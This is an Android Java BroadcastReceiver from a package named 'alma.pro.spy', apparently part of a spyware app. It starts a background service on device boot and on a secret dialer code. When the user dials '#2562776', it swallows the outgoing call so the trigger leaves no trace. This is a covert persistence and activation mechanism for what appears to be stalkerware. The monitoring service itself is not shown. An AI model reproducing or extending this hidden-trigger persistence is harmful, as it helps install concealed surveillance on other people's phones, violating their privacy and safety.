package alma.pro.spy;

import android.app.ActivityManager;
import android.app.admin.DeviceAdminReceiver;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class apsServiceStart extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            if(isMyServiceRunning(apsService.class,context)) return;
            Intent serviceIntent = new Intent(context, apsService.class);
            context.startService(serviceIntent);
        }else if("android.provider.Telephony.SECRET_CODE".equals(intent.getAction())){
            if(isMyServiceRunning(apsService.class,context)) return;
            Intent serviceIntent = new Intent(context, apsService.class);
            context.startService(serviceIntent);
        }else if(Intent.ACTION_NEW_OUTGOING_CALL.equals(intent.getAction())){
             String n = intent.getExtras().getString(Intent.EXTRA_PHONE_NUMBER);
            if(n != null && n.equals("#2562776") || n != null && n.equals("2562776")){
                setResultData(null);
                abortBroadcast();
                if(isMyServiceRunning(apsService.class,context)) return;
                Intent serviceIntent = new Intent(context, apsService.class);
                context.startService(serviceIntent);
            }
        }
    }
    private boolean isMyServiceRunning(Class<?> serviceClass,Context c) {
        try{
            ActivityManager manager = (ActivityManager) c.getSystemService(Context.ACTIVITY_SERVICE);
            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                if (serviceClass.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }
}